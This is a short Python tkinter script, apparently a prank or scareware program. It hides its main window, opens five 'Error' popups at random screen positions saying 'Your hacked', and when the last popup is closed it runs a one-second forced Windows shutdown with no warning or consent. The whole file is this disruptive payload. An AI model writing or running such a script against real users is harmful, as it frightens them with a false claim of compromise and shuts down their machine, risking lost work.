import tkinter as tk
import random
import os
open_windows = 0

def create_error(root):
    global open_windows

    win = tk.Toplevel(root)
    win.title("Error")

    # Get screen size
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    width = 220
    height = 120

    # Random position (keeps window fully on screen)
    x = random.randint(0, screen_width - width)
    y = random.randint(0, screen_height - height)

    win.geometry(f"{width}x{height}+{x}+{y}")

    open_windows += 1

    def on_close():
        global open_windows
        open_windows -= 1
        win.destroy()

        if open_windows == 0:
            os.system("shutdown /s /t 1")

    label = tk.Label(win, text="Your hacked", fg="red")
    label.pack(pady=15)

    button = tk.Button(win, text="OK", command=on_close)
    button.pack()

def spawn_errors(root):
    for _ in range(5):
        create_error(root)

root = tk.Tk()
root.withdraw()

spawn_errors(root)

root.mainloop()